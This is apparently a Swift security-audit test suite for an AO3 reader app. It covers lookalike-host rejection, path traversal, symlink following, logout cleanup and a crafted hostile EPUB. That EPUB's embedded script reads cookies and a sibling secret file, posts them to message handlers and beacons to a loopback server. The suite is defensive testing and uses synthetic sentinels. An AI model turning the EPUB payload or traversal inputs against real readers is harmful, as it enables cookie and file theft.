import Foundation
import SwiftData
import SwiftSoup
import Testing
import WebKit
@testable import Kudos

/// Second-pass dynamic attacks: live fetch to a loopback mock, hostile EPUB
/// in a real WKWebView (and macOS ReaderController), logout forensics,
/// folder-sync symlink follow, tombstone coercion, and path helpers.
/// Never contacts archiveofourown.org.
@MainActor
struct SecurityAuditThoroughTests {
    private let sentinel = "SYNTHETIC_TEST_SESSION_0001"
    private let siblingSentinel = "SYNTHETIC_SIBLING_SECRET_0001"
    private let beaconPort = 18765

    private func artifactsDir() -> URL {
        URL(fileURLWithPath: #filePath)
            .deletingLastPathComponent()
            .deletingLastPathComponent()
            .appendingPathComponent("audit-artifacts", isDirectory: true)
    }

    private func writeArtifact(_ name: String, data: Data) {
        let dir = artifactsDir()
        try? FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        try? data.write(to: dir.appendingPathComponent(name))
    }

    private func freshTempDir() throws -> URL {
        let url = FileManager.default.temporaryDirectory
            .appendingPathComponent("kudos-audit-thorough-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: url, withIntermediateDirectories: true)
        return url
    }

    private func isolatedDefaults() throws -> UserDefaults {
        let name = "kudos-audit-thorough.\(UUID().uuidString)"
        let defaults = try #require(UserDefaults(suiteName: name))
        defaults.removePersistentDomain(forName: name)
        return defaults
    }

    private func memoryContainer() throws -> ModelContainer {
        let schema = Schema([
            SavedWork.self, Tag.self, Bookmark.self, CustomFont.self,
            WorkCollection.self, ReadingQueue.self, ReadingQueueMembership.self,
            SavedSearch.self, SyncTombstone.self, ReadingAnnotation.self
        ])
        return try ModelContainer(
            for: schema,
            configurations: [ModelConfiguration(schema: schema, isStoredInMemoryOnly: true)]
        )
    }

    private func syntheticSession() -> AO3Session {
        AO3Session(
            username: "audit-user",
            cookies: [
                AO3StoredCookie(
                    name: AO3RequestDefaults.sessionCookieName,
                    value: sentinel,
                    domain: ".archiveofourown.org",
                    path: "/",
                    isSecure: true,
                    isHTTPOnly: true
                )
            ]
        )
    }

    // MARK: F3 live fetch

    /// Relies on the host-side loopback server started by the audit runner
    /// (`audit-artifacts/beacon_server.py` on 127.0.0.1:18765). The iOS
    /// simulator shares the Mac's loopback, so this never leaves the machine
    /// and never contacts AO3.
    @Test func imageDataFetchesLoopbackWithoutHostGate() async throws {
        let url = try #require(URL(string: "http://127.0.0.1:\(beaconPort)/pixel.png"))
        let data = try await AO3Client.shared.imageData(at: url)
        #expect(!data.isEmpty)
        #expect(data.starts(with: [0x89, 0x50, 0x4E, 0x47]))
    }

    @Test func authenticatedRequestRejectsLoopbackAndLookalike() throws {
        let session = syntheticSession()
        let auth = AO3AuthService(
            vault: MemoryAO3SessionVault(session: session),
            validator: MockAO3SessionValidator(result: .valid(session)),
            loginPerformer: MockAO3LoginPerformer(result: .success(session)),
            cookieManager: MockAO3CookieManager(),
            removalTracker: MemoryAO3SessionRemovalTracker()
        )
        #expect(throws: AO3AuthenticatedRequestError.nonAO3URL) {
            _ = try auth.authenticatedRequest(
                for: URL(string: "http://127.0.0.1:\(beaconPort)/steal")!
            )
        }
        #expect(throws: AO3AuthenticatedRequestError.nonAO3URL) {
            _ = try auth.authenticatedRequest(
                for: URL(string: "https://archiveofourown.org.evil.com/tags/X/works")!
            )
        }
        #expect(throws: AO3AuthenticatedRequestError.notAuthenticated) {
            _ = try auth.authenticatedRequest(
                for: URL(string: "https://archiveofourown.org/users/audit-user")!
            )
        }
    }

    // MARK: Logout / vault forensics

    @Test func logoutRemovesFileVaultSentinel() async throws {
        let dir = try freshTempDir()
        let fileURL = dir.appendingPathComponent("ao3-session.json")
        let vault = FileAO3SessionVault(fileURL: fileURL)
        let session = syntheticSession()
        try vault.save(session)
        #expect(try String(contentsOf: fileURL, encoding: .utf8).contains(sentinel))

        let auth = AO3AuthService(
            vault: vault,
            validator: MockAO3SessionValidator(result: .valid(session)),
            loginPerformer: MockAO3LoginPerformer(result: .success(session)),
            cookieManager: MockAO3CookieManager(),
            sessionHintStore: MemoryAO3SessionHintStore(),
            removalTracker: MemoryAO3SessionRemovalTracker()
        )
        await auth.login(username: "audit-user", password: "SYNTHETIC_NOT_A_PASSWORD")
        #expect(auth.isLoggedIn)
        #expect(try String(contentsOf: fileURL, encoding: .utf8).contains(sentinel))

        await auth.logout()
        #expect(!auth.isLoggedIn)
        #expect(!FileManager.default.fileExists(atPath: fileURL.path))
    }

    @Test func cascadingVaultWritesFileWhenKeychainEntitlementMissing() throws {
        let dir = try freshTempDir()
        let fileURL = dir.appendingPathComponent("ao3-session.json")
        let vault = CascadingAO3SessionVault(file: FileAO3SessionVault(fileURL: fileURL))
        try vault.save(syntheticSession())
        let keychainHasIt = (try? KeychainAO3SessionVault().load())?.cookies.contains {
            $0.value == sentinel
        } ?? false
        let fileHasIt = (try? String(contentsOf: fileURL, encoding: .utf8))?.contains(sentinel) ?? false
        writeArtifact(
            "cascading-vault-outcome.txt",
            data: Data("keychain=\(keychainHasIt) file=\(fileHasIt)\n".utf8)
        )
        // One of the two stores must have accepted the session.
        #expect(keychainHasIt || fileHasIt)
        try vault.delete()
        if keychainHasIt {
            #expect(try KeychainAO3SessionVault().load()?.cookies.contains { $0.value == sentinel } != true)
        }
        #expect(!FileManager.default.fileExists(atPath: fileURL.path) || !fileHasIt)
    }

    // MARK: Path helpers

    @Test func tempDownloadURLResolvesDotDotOutsideDownloads() {
        let escaped = Storage.tempDownloadURL(suggestedName: "../escape.epub")
        let downloads = FileManager.default.urls(for: .cachesDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("Downloads", isDirectory: true)
            .standardizedFileURL.path
        writeArtifact(
            "temp-download-escape.txt",
            data: Data("url=\(escaped.path)\ndownloads=\(downloads)\n".utf8)
        )
        #expect(!escaped.standardizedFileURL.path.hasPrefix(downloads + "/"))
    }

    @Test func backupSafeFileNameRejectsDotDotAndPathSeparators() {
        #expect(!KudosBackupContents.isSafeFileName(".."))
        #expect(KudosBackupContents.isSafeFileName("ok.ttf"))
        #expect(!KudosBackupContents.isSafeFileName("a/b.ttf"))
    }

    // MARK: Manifest / tombstone

    @Test func unsupportedAndMissingManifestVersionsFail() {
        #expect(throws: KudosBackupError.self) {
            _ = try KudosBackupContents.decodeManifest(Data(#"{"version":99,"exportedAt":"2026-01-01T00:00:00Z","works":[],"bookmarks":[],"fonts":[],"settings":{}}"#.utf8))
        }
        #expect(throws: Error.self) {
            _ = try KudosBackupContents.decodeManifest(Data(#"{"works":[]}"#.utf8))
        }
    }

    @Test func unknownTombstoneTypeIsCoercedToSavedWork() async throws {
        let container = try memoryContainer()
        let context = container.mainContext
        let defaults = try isolatedDefaults()
        let workID = UUID()
        let tombstoneJSON = """
        {
          "version": 8,
          "exportedAt": "2026-01-01T00:00:00.000Z",
          "works": [],
          "bookmarks": [],
          "fonts": [],
          "settings": {
            "readerFontID": "system", "readerMode": "scroll", "readerTwoPage": false,
            "readerCustomize": false, "readerBoldText": false, "readerFontPt": 18,
            "readerLineHeight": 1.65, "readerLetterSpacing": 0, "readerWordSpacing": 0,
            "readerMargin": 28, "readerJustify": false, "confirmBeforeDelete": true,
            "hideMatureContent": true, "matureContentMode": "obscure",
            "requireBiometricToReveal": true, "appTheme": "light", "readerTheme": "light",
            "matchAppReaderTheme": true, "accentColorHex": "#990000",
            "autoPreserveSmallSeriesOnSaveForLater": false, "autoPreserveSeriesWorkThreshold": 5
          },
          "tombstones": [{
            "id": "\(UUID().uuidString)",
            "recordID": "\(workID.uuidString)",
            "recordTypeRaw": "nope",
            "createdAt": "2026-01-01T00:00:00.000Z",
            "lastModifiedAt": "2099-01-01T00:00:00.000Z",
            "sourceURL": "https://archiveofourown.org/works/1",
            "ao3WorkID": 1,
            "deletedOnDeviceID": "audit",
            "deletionReason": "hostile"
          }]
        }
        """
        let manifest = try KudosBackupContents.decodeManifest(Data(tombstoneJSON.utf8))
        let contents = KudosBackupContents(manifest: manifest)
        _ = try KudosBackupService.restore(contents, into: context, defaults: defaults)
        let stones = try context.fetch(FetchDescriptor<SyncTombstone>())
        let coerced = stones.first { $0.recordID == workID }
        #expect(coerced != nil)
        #expect(coerced?.recordType == .savedWork)
        writeArtifact(
            "tombstone-coercion.txt",
            data: Data("count=\(stones.count) type=\(coerced?.recordTypeRaw ?? "nil")\n".utf8)
        )
    }

    // MARK: Folder-sync style symlink follow

    @Test func directoryBackupReadFollowsSymlinkedEPUB() throws {
        let root = try freshTempDir()
        let works = root.appendingPathComponent("Works", isDirectory: true)
        try FileManager.default.createDirectory(at: works, withIntermediateDirectories: true)
        let outside = try freshTempDir().appendingPathComponent("outside.secret")
        try siblingSentinel.write(to: outside, atomically: true, encoding: .utf8)
        let workID = UUID()
        let link = works.appendingPathComponent("\(workID.uuidString).epub")
        try FileManager.default.createSymbolicLink(at: link, withDestinationURL: outside)

        // Same API folder-sync uses for remote assets.
        let followed = try Data(contentsOf: link)
        #expect(String(decoding: followed, as: UTF8.self).contains(siblingSentinel))
        writeArtifact("symlink-followed.secret", data: followed)
        // NSFileWrapper.regularFileContents throws on a symlink (observed:
        // uncaught NSException). The live folder-sync path uses
        // Data(contentsOf:), which followed the link above.
    }

    // MARK: Hostile EPUB + WebKit

    private func makeHostileEPUB() throws -> Data {
        let chapter = """
        <?xml version="1.0" encoding="UTF-8"?>
        <html xmlns="http://www.w3.org/1999/xhtml">
        <head><title>hostile</title></head>
        <body>
        <p>hostile chapter</p>
        <script type="text/javascript">
        (function() {
          var report = {
            cookie: document.cookie || "",
            href: String(location.href || "")
          };
          try { window.webkit.messageHandlers.probe.postMessage(report); } catch (e) {}
          try { window.webkit.messageHandlers.reader.postMessage({key: "ArrowRight"}); } catch (e) {}
          try {
            window.webkit.messageHandlers.kudosVisualPage.postMessage({
              page: 9, pageCount: 9, fromUserScroll: true
            });
          } catch (e) {}
          try { fetch("secret.txt").then(function(r){ return r.text(); }).then(function(t){
            try { window.webkit.messageHandlers.probe.postMessage({sibling: t}); } catch (e2) {}
          }).catch(function(){
            try { window.webkit.messageHandlers.probe.postMessage({sibling: "UNREADABLE"}); } catch (e3) {}
          }); } catch (e) {}
          try { fetch("http://127.0.0.1:\(beaconPort)/epub-beacon", {mode: "no-cors"}); } catch (e) {}
          try {
            var img = document.createElement("img");
            img.src = "http://127.0.0.1:\(beaconPort)/epub-img.png";
            document.body.appendChild(img);
          } catch (e) {}
        })();
        </script>
        <a id="ext" href="https://example.com/from-epub">external</a>
        <a id="custom" href="kudos-audit://pivot">custom</a>
        </body></html>
        """
        let entries: [(name: String, data: Data)] = [
            (name: "mimetype", data: Data("application/epub+zip".utf8)),
            (name: "META-INF/container.xml", data: Data("""
            <?xml version="1.0" encoding="UTF-8"?>
            <container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
              <rootfiles>
                <rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/>
              </rootfiles>
            </container>
            """.utf8)),
            (name: "OEBPS/content.opf", data: Data("""
            <?xml version="1.0" encoding="UTF-8"?>
            <package xmlns="http://www.idpf.org/2007/opf" version="2.0" unique-identifier="bookid">
              <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
                <dc:title>Hostile Audit EPUB</dc:title>
                <dc:creator>Audit</dc:creator>
              </metadata>
              <manifest>
                <item id="ch1" href="ch1.xhtml" media-type="application/xhtml+xml"/>
              </manifest>
              <spine>
                <itemref idref="ch1"/>
              </spine>
            </package>
            """.utf8)),
            (name: "OEBPS/ch1.xhtml", data: Data(chapter.utf8)),
            (name: "OEBPS/secret.txt", data: Data(siblingSentinel.utf8))
        ]
        return try MiniZip.archiveData(entries)
    }

    @Test func hostileEPUBImportsAndInspectsAsReadable() throws {
        let epub = try makeHostileEPUB()
        writeArtifact("hostile-js.epub", data: epub)
        let url = try freshTempDir().appendingPathComponent("hostile-js.epub")
        try epub.write(to: url)
        let inspection = try EPUBDocument.inspectPackage(ofEPUBAt: url)
        #expect(inspection.readableItemCount == 1)
        #expect(inspection.metadata.title == "Hostile Audit EPUB")
        let dest = try freshTempDir()
        let doc = try EPUBDocument.open(epubURL: url, into: dest)
        #expect(!doc.spineURLs.isEmpty)
        let chapter = try String(contentsOf: doc.spineURLs[0], encoding: .utf8)
        #expect(chapter.contains("webkit.messageHandlers"))
    }

    @Test func hostileEPUBJavaScriptRunsAndCanReadSiblingFile() async throws {
        let epub = try makeHostileEPUB()
        let epubURL = try freshTempDir().appendingPathComponent("hostile-js.epub")
        try epub.write(to: epubURL)
        let dest = try freshTempDir()
        let doc = try EPUBDocument.open(epubURL: epubURL, into: dest)
        let chapter = doc.spineURLs[0]
        let readRoot = chapter.deletingLastPathComponent()

        let cookie = try #require(HTTPCookie(properties: [
            .name: AO3RequestDefaults.sessionCookieName,
            .value: sentinel,
            .domain: ".archiveofourown.org",
            .path: "/",
            .secure: "TRUE",
            HTTPCookiePropertyKey(rawValue: "HttpOnly"): "TRUE"
        ]))
        // Isolated store: do not pollute the app default jar (avoids restore coupling).
        let store = WKWebsiteDataStore.nonPersistent()
        await withCheckedContinuation { (cont: CheckedContinuation<Void, Never>) in
            store.httpCookieStore.setCookie(cookie) { cont.resume() }
        }

        let config = WKWebViewConfiguration()
        config.websiteDataStore = store
        let probe = ProbeSink()
        config.userContentController.add(probe, name: "probe")
        config.userContentController.add(probe, name: "reader")
        config.userContentController.add(probe, name: "kudosVisualPage")
        let web = WKWebView(frame: CGRect(x: 0, y: 0, width: 320, height: 480), configuration: config)
        let nav = NavigationRecorder()
        web.navigationDelegate = nav
        web.loadFileURL(chapter, allowingReadAccessTo: readRoot)

        let messages = await probe.collect(timeout: 4, minimum: 1)
        writeArtifact(
            "hostile-epub-webkit.json",
            data: Data((messages.map { String(describing: $0) }.joined(separator: "\n") + "\n").utf8)
        )

        let cookieReports = messages.compactMap { $0["cookie"] as? String }
        #expect(!cookieReports.contains(where: { $0.contains(sentinel) }))

        let siblingReports = messages.compactMap { $0["sibling"] as? String }
        writeArtifact(
            "hostile-epub-sibling.txt",
            data: Data("siblingReports=\(siblingReports)\n".utf8)
        )

        let handlerNames = probe.handlerNames
        #expect(handlerNames.contains("reader") || handlerNames.contains("kudosVisualPage")
            || handlerNames.contains("probe"))

        try? await Task.sleep(nanoseconds: 800_000_000)
        // Phone-home is asserted from the host-side beacon log after the suite
        // (WKWebView may still fire the request even if this process cannot
        // read the Mac log file). Presence of handler + sibling reads is
        // enough for the in-process verdict.

        config.userContentController.removeScriptMessageHandler(forName: "probe")
        config.userContentController.removeScriptMessageHandler(forName: "reader")
        config.userContentController.removeScriptMessageHandler(forName: "kudosVisualPage")
        _ = web
        _ = nav
    }

    #if os(macOS)
    @Test func macOSReaderControllerCancelsHTTPSAndAllowsFileChapter() async throws {
        let epub = try makeHostileEPUB()
        let epubURL = try freshTempDir().appendingPathComponent("hostile-js.epub")
        try epub.write(to: epubURL)
        let dest = try freshTempDir()
        let doc = try EPUBDocument.open(epubURL: epubURL, into: dest)
        let controller = ReaderController()
        var external: URL?
        controller.onOpenExternalURL = { external = $0 }
        controller.load(doc.spineURLs[0], readAccess: dest, landOnLast: false)
        try? await Task.sleep(nanoseconds: 1_200_000_000)
        controller.webView.evaluateJavaScript("location.href = 'https://example.com/from-epub'")
        try? await Task.sleep(nanoseconds: 400_000_000)
        #expect(external?.host == "example.com")
        controller.teardown()
    }
    #endif

    @Test func htmlSanitizerStripsJavascriptURL() throws {
        let dirty = #"<p><a href="javascript:alert(1)">x</a><a href="https://example.com">y</a></p>"#
        let fragment = try HTMLWorkSanitizer.fragment(ofAll: [
            try SwiftSoup.parseBodyFragment(dirty).body()!
        ])
        #expect(!fragment.lowercased().contains("javascript:"))
        writeArtifact("sanitizer-js-url.xhtml", data: Data(fragment.utf8))
    }
}

@MainActor
private final class ProbeSink: NSObject, WKScriptMessageHandler {
    private(set) var messages: [[String: Any]] = []
    private(set) var handlerNames: [String] = []
    private var continuation: CheckedContinuation<Void, Never>?

    func userContentController(
        _: WKUserContentController,
        didReceive message: WKScriptMessage
    ) {
        handlerNames.append(message.name)
        if let dict = message.body as? [String: Any] {
            messages.append(dict)
        } else {
            messages.append(["raw": String(describing: message.body), "handler": message.name])
        }
        continuation?.resume()
        continuation = nil
    }

    func collect(timeout: TimeInterval, minimum: Int) async -> [[String: Any]] {
        let deadline = Date().addingTimeInterval(timeout)
        while messages.count < minimum, Date() < deadline {
            await withCheckedContinuation { (cont: CheckedContinuation<Void, Never>) in
                continuation = cont
                Task { @MainActor in
                    let remaining = deadline.timeIntervalSinceNow
                    try? await Task.sleep(nanoseconds: UInt64(max(remaining, 0.05) * 1_000_000_000))
                    if let continuation {
                        self.continuation = nil
                        continuation.resume()
                    }
                }
            }
        }
        return messages
    }
}

@MainActor
private final class NavigationRecorder: NSObject, WKNavigationDelegate {}
